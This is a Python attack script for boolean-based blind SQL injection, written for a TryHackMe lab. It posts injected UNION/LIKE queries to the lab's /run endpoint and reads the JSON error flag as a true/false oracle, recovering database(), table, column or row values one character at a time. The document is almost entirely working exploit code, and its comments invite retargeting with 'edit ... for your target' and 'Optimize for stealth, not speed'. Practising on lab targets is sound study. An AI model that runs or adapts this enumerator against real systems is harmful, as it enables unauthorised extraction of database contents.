#!/usr/bin/env python3
"""
Boolean-based blind SQLi enumeration (THM Level 3 style).

Walks a target one character at a time using a `LIKE 'prefix%'` oracle.
Each request asks "does the next character match X?"; the JSON response
returns `error: false` for TRUE and `error: true` for FALSE.

Educational version — linear scan over a charset, no parallelization.
Optimize for stealth, not speed.

Usage:
    edit BASE_URL, LEVEL, and the SELECT_TEMPLATE below for your target
    python boolean_blind_enum.py
"""
import urllib.request
import urllib.parse
import json
import string
import sys

# ---- CONFIG ----------------------------------------------------------------
BASE_URL = "https://YOUR-INSTANCE.reverse-proxy.cell-prod-eu-central-1a.vm.tryhackme.com/run"
LEVEL = "3"

# What are we extracting? Edit the inner SELECT for your target.
# Example below: walk the current database name character by character.
# To retarget a table name, column name, or row value, swap the SELECT.
SELECT_TEMPLATE = (
    "select * from users where username = 'admin123' "
    "UNION SELECT 1,2,3 where ({expr}) like '{prefix}%';--' "
    "LIMIT 1"
)

# Expression to extract (use database(), table_name, column_name, etc.)
EXPRESSION = "database()"

# Charset to scan (digits + lowercase is enough for most THM-style targets;
# expand to include upper / punctuation if the value might contain them)
CHARSET = string.ascii_lowercase + string.digits + "_"

# Stop after this many characters of length
MAX_LEN = 30
# -----------------------------------------------------------------------------


def oracle(sql: str) -> bool:
    """
    Send the SQL to /run and return True if the boolean condition was TRUE.

    THM Level 3 returns:
      {"error": false, "message": "true", ...}  on TRUE
      {"error": true,  "message": "false", ...} on FALSE
    """
    body = urllib.parse.urlencode({"level": LEVEL, "sql": sql}).encode()
    req = urllib.request.Request(
        BASE_URL, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    with urllib.request.urlopen(req) as r:
        resp = json.loads(r.read().decode())
    return resp.get("error", True) is False


def enumerate() -> str:
    """Walk the value one character at a time."""
    value = ""
    while len(value) < MAX_LEN:
        found = False
        for c in CHARSET:
            sql = SELECT_TEMPLATE.format(expr=EXPRESSION, prefix=value + c)
            if oracle(sql):
                value += c
                sys.stdout.write(f"\r[+] {value}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            # Confirm: is `value` an exact match (no wildcard)?
            sql = SELECT_TEMPLATE.format(expr=EXPRESSION, prefix=value).replace("%", "")
            if oracle(sql):
                sys.stdout.write(f"\n[DONE] {value!r}\n")
                return value
            sys.stdout.write(f"\n[END?] partial={value!r}\n")
            return value
    sys.stdout.write(f"\n[LEN] truncated at {MAX_LEN}\n")
    return value


if __name__ == "__main__":
    print(f"[*] target: {BASE_URL}")
    print(f"[*] expression: {EXPRESSION}")
    print(f"[*] charset: {len(CHARSET)} chars")
    enumerate()
